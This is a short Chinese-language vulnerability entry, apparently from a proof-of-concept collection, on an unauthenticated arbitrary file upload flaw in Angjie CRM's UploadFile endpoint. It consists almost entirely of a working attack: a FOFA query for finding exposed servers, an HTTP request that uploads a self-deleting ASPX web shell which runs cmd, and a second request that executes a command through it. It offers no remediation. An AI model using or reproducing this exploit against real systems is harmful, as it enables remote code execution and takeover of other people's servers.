## 昂捷CRM UploadFile 任意文件上传漏洞

## 漏洞描述
昂捷CRM 的 `UploadFile` 功能缺少后缀校验与鉴权，攻击者可上传脚本文件后直接访问执行，获取服务器权限。

## 网络空间测绘
```
fofa: body="CheckSilverlightInstalled" && body="AllowHtmlPopupwindow"
```

## POC
```
POST /file/UploadFile?fileinfo={'UploadUserNo':'0000','LastChunk':true,'FileName':'aa1.aspx','IsUseMongdb':true,'UploadTime':'2025-06-18T12:11:56'} HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 472

<%@ Page Language="JScript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
Response.Write(out.ReadToEnd()+EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();
%>
```

```
POST /TempFileNew/0000_202506181211560000_aa1.aspx HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.2244.69 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

cmd=dir
```

## 参考
- 社区情报

